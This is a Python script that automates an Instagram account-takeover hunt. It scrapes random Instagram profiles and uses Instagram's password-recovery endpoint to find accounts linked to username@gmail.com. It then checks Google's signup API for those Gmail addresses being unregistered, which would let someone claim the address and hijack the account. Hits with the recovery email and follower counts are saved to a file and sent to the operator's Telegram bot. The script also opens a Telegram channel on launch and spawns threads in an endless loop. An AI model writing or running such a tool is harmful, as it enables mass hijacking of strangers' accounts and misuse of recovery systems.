#ادات مـغيـد 
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread,Timer
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice,randrange
from cfonts import render,say
from colorama import Fore,Style,init
import webbrowser
init(autoreset = True)
import webbrowser
webbrowser.open('https://t.me/ARO00TT')
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0'
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
TOKEN_FILE = 'tl.txt'
eizon_domain = '@gmail.com'
E = '\x1b[1;31m'
W9 = '\x1b[1m\x1b[34m'
M = '\x1b[1;37m'
HH = '\x1b[1;34m'
R = '\x1b[1;31;40m'
F = '\x1b[1;32;40m'
C = '\x1b[1;97;40m'
B = '\x1b[1;36;40m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\x1b[1;31m'
Y = '\x1b[1;33m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;34m'
C = '\x1b[2;35m'
S = '\x1b[2;36m'
E = '\x1b[1;31m'
Y = '\x1b[1;33m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
red = '\x1b[1m\x1b[31m'
green = '\x1b[1m\x1b[32m'
yellow = '\x1b[1m\x1b[33m'
blue = '\x1b[1m\x1b[34m'
cyan = '\x1b[1m\x1b[36m'
magenta = '\x1b[1m\x1b[35m'
M = '\x1b[1m\x1b[36m'
white = '\x1b[1m\x1b[37m'
orange = '\x1b[1m\x1b[38;5;208m'
reset = '\x1b[0m'
red = '\x1b[1m\x1b[31m'
green = '\x1b[1m\x1b[32m'
yellow = '\x1b[1m\x1b[33m'
blue = '\x1b[1m\x1b[34m'
cyan = '\x1b[1m\x1b[36m'
magenta = '\x1b[1m\x1b[35m'
M = '\x1b[1m\x1b[36m'
white = '\x1b[1m\x1b[37m'
orange = '\x1b[1m\x1b[38;5;208m'
reset = '\x1b[0m'
red = '\x1b[1m\x1b[31m'
green = '\x1b[1m\x1b[32m'
yellow = '\x1b[1m\x1b[33m'
blue = '\x1b[1m\x1b[34m'
cyan = '\x1b[1m\x1b[36m'
magenta = '\x1b[1m\x1b[35m'
M = '\x1b[1m\x1b[36m'
white = '\x1b[1m\x1b[37m'
orange = '\x1b[1m\x1b[38;5;208m'
reset = '\x1b[0m'
W1 = '\x1b[1;97m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = '\x1b[1;33m'
W8 = '\x1b[2;36m'
W8 = '\x1b[38;5;117m'
W9 = '\x1b[1m\x1b[34m'
BLUE = '\x1b[94m'
RESET = '\x1b[0m'
BOLD = '\x1b[1m'
YELLOW = '\x1b[93m'
RED = '\x1b[91m'
GREEN = '\x1b[92m'
CYAN = '\x1b[96m'
red = '\x1b[1m\x1b[31m'
green = '\x1b[1m\x1b[32m'
yellow = '\x1b[1m\x1b[33m'
blue = '\x1b[1m\x1b[34m'
cyan = '\x1b[1m\x1b[36m'
magenta = '\x1b[1m\x1b[35m'
M = '\x1b[1m\x1b[36m'
white = '\x1b[1m\x1b[37m'
orange = '\x1b[1m\x1b[38;5;208m'
reset = '\x1b[0m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;34m'
C = '\x1b[2;35m'
S = '\x1b[2;36m'
G = '\x1b[1;34m'
HH = '\x1b[1;34m'
O = '\x1b[38;5;208m'
Y = '\x1b[1;34m'
C = '\x1b[2;35c'
M = '\x1b[1;37m'
total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = { }
ing = render('M G E D',colors = [
    'red',
    'red'],align = 'center',font = 'block')
print(ing)
ID = input('\x1b[93m[🇺🇸] 𝗜𝗗 ➔  ')
print('')
TOKEN = input('\x1b[32m[🇺🇸] 𝗧𝗢𝗞𝗘𝗡 ➔ ')
os.system('clear' if os.name != 'nt' else 'cls')
while True: 
    def pppp():
        ge = hits
        bt = bad_insta + bad_email
        be = good_ig
        print(f'''\r{F}    Hits{HH} : {M}{ge} ~ {Z} Bad  {HH} : {M}{bt} ~ {X} Good  {HH} : {M}{be} {G}   [ @lllX_K ] ''', end='', flush=True)
    
    
    def update_stats():
        pppp()
    
    
    def Eizon():
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            # Fixed the lambda functions to generate random strings
            def generate_random_string(min_len, max_len):
                return ''.join(random.choice(alphabet) for _ in range(random.randrange(min_len, max_len + 1)))
    
            n1 = generate_random_string(6, 9)
            n2 = generate_random_string(3, 9)
            host = generate_random_string(15, 30)
    
            headers = {
                USER_AGENT_HEADER: str(generate_user_agent()),
                'google-accounts-xsrf': '1',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                'accept': '*/*' }
            recovery_url = f'''{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB'''
            res1 = requests.get(recovery_url,headers = headers)
            tok_match = re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text)
            if tok_match:
                tok = tok_match.group(2)
            else:
                print(f'{E}Failed to extract tok in Eizon()')
                return
    
            cookies = {
                '__Host-GAPS': host }
            headers2 = {
                USER_AGENT_HEADER: generate_user_agent(),
                REFERRER_HEADER: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
                ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
                'google-accounts-xsrf': '1',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN }
            data = {
                'f.req': f'''["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]''',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]' }
            response = requests.post(f'''{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails''',cookies = cookies,headers = headers2,data = data)
            token_line_match = str(response.text).split('",null,"')
            if len(token_line_match) > 1:
                token_line = token_line_match[1].split('"')[0]
            else:
                print(f'{E}Failed to extract token_line in Eizon()')
                return
    
            host = response.cookies.get_dict()['__Host-GAPS']
            
            with open(TOKEN_FILE,'w') as f:
                f.write(f'''{token_line}//{host}\n''')
                
        except Exception as e:
            print(f'{E}An error occurred in Eizon: {e}{reset}')
            Eizon()
    
    
    Eizon()
    
    def check_gmail(email):
        global hits,bad_email
        try:
            if '@' in email:
                email = email.split('@')[0]
            
            try:
                with open(TOKEN_FILE,'r') as f:
                    token_data_lines = f.read().splitlines()
                    if not token_data_lines:
                        print(f'{E}TOKEN_FILE is empty. Re-running Eizon...{reset}')
                        Eizon()
                        return
                    token_data = token_data_lines[0]
            except FileNotFoundError:
                print(f'{E}TOKEN_FILE not found. Re-running Eizon...{reset}')
                Eizon()
                return
                
            (tl,host) = token_data.split('//')
            cookies = {
                '__Host-GAPS': host }
            headers = {
                USER_AGENT_HEADER: generate_user_agent(),
                REFERRER_HEADER: f'''https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}''',
                ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
                'google-accounts-xsrf': '1',
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN }
            params = {
                'TL': tl }
            data = f'''continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'''
            response = pp(f'''{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability''',params = params,cookies = cookies,headers = headers,data = data)
            if '"gf.uar",1' in response.text:
                hits += 1
                update_stats()
                full_email = email + eizon_domain
                (username,domain) = full_email.split('@')
                InfoAcc(username,domain)
                
            else: # Assumed to be a bad email if not a hit
                bad_email += 1
                update_stats()
                
        except Exception as e:
            # If any exception occurs during the check, increment bad_email and print the error
            bad_email += 1
            update_stats()
            # print(f'{E}An error occurred in check_gmail: {e}{reset}') # Optional: Print error for debugging
    
    
    def check(email):
        global good_ig,bad_insta
        try:
            ua = generate_user_agent()
            dev = 'android-'
            device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
            uui = str(uuid.uuid4())
            headers = {
                CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM,
                COOKIE_HEADER: COOKIE_VALUE,
                USER_AGENT_HEADER: ua }
            data = {
                IG_SIG_KEY_VERSION: '4',
                SIGNED_BODY: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                    '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                    'adid': uui,
                    'guid': uui,
                    'device_id': device_id,
                    'query': email }) }
            response = requests.post(INSTAGRAM_RECOVERY_URL,headers = headers,data = data).text
            
            if email in response:
                if eizon_domain in email:
                    check_gmail(email)
                
                good_ig += 1
                update_stats()
            else:
                bad_insta += 1
                update_stats()
    
        except Exception as e:
            bad_insta += 1
            update_stats()
            # print(f'{E}An error occurred in check: {e}{reset}') # Optional: Print error for debugging
    
    
    def rest(user):
        try:
            headers = {
                'Connection': 'keep-alive',
                'Content-Length': '356' }
            data = {
                IG_SIG_KEY_VERSION: '4',
                SIGNED_BODY: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + user + '"}' }
            response = requests.post(INSTAGRAM_RECOVERY_URL,headers = headers,data = data).json()
            eizonporno = response.get('email', 'Reset None')
            return eizonporno
        except:
            return 'Reset None'
    
    
    def date(hy):
        ranges = [
            (900990000,2013),
            (1629010000,2014),
            (0x9502F900,2015), # Removed L for modern Python compatibility
            (0xDD5A16B2,2016), # Removed L
            (0x153BBD201,2017), # Removed L
            (0x2007A242D,2018), # Removed L
            (0x4F2D6C20A,2019)] # Removed L
        
        for upper, year in ranges:
            if hy <= upper:
                return year # Fixed to return the year
    
        # Default return value, as the original code had 2023 outside the loop
        return 2023
    
    
    def InfoAcc(username,domain):
        global total_hits
        try:
            account_info = infoinsta.get(username,{ })
            user_id = account_info.get('pk')
            full_name = account_info.get('full_name')
            followers = account_info.get('follower_count')
            following = account_info.get('following_count')
            posts = account_info.get('media_count')
            bio = account_info.get('biography')
            total_hits += 1
            info_text = f'''\n      ⛧⋆𝗜𝗡𝗦𝗧𝗔 𝐇𝐈𝐓 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗙𝗼𝘂𝗻𝗱  🇺🇸\n▬▬▬▬▬▬▬▬▬▬▬▬▬     \n🇺🇸 『𖤍』مـغـيـد 『𖤍』\n ▬▬▬▬▬▬▬▬▬▬▬▬▬      \n\n🇺🇸𝙷𝚒𝚝 - {total_hits} ﴿\n\n🇺🇸﴾ 𝙶𝚊𝚖𝚒𝚕 - 🇺🇸{username}@{domain} ﴿\n\n🇺🇸﴾ ᎡᎬՏͲ - {rest(username)}﴿\n\n🇺🇸﴾ 𝙽𝚊𝚖𝚎 - {username} ﴿\n\n🇺🇸﴾ 𝚏𝚘𝚕𝚕𝚘𝚠𝚛𝚜 - {followers} ﴿\n\n🇺🇸﴾ 𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 - {following} ﴿\n\n▬▬▬▬▬▬▬▬▬▬▬▬▬\n@lllX_K\n▬▬▬▬▬▬▬▬▬▬▬▬▬\n'''
            
            with open('HIT.txt','a') as f:
                f.write(info_text + '\n')
                
            requests.get(f'''https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}''')
            
        except Exception as e:
            # print(f'{E}An error occurred in InfoAcc: {e}{reset}') # Optional: Print error for debugging
            pass
    
    
    def eizon_python():
        try:
            # Changed random.randrange to be within typical 32-bit range and removed L suffix
            rand_id = random.randrange(1629010000, 2500000000) 
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits,k = 32)),
                'variables': json.dumps({
                    'id': rand_id,
                    'render_surface': 'PROFILE' }),
                'doc_id': '25618261841150840' }
            headers = {
                'X-FB-LSD': data['lsd'] }
            response = requests.post('https://www.instagram.com/api/graphql',headers = headers,data = data)
            account = response.json().get('data',{ }).get('user',{ })
            username = account.get('username')
            if username:
                followers = account.get('follower_count',0)
                if followers < 20:
                    pass
                infoinsta[username] = account
                emails = [
                    username + eizon_domain]
                for email in emails:
                    check(email)
                    
        except Exception as e:
            # print(f'{E}An error occurred in eizon_python: {e}{reset}') # Optional: Print error for debugging
            pass
    
    
    def stats_loop():
        while True:
            update_stats()
            time.sleep(1)
    
    Thread(target = stats_loop,daemon = True).start()
    for _ in range(100):
        Thread(target = eizon_python).start()
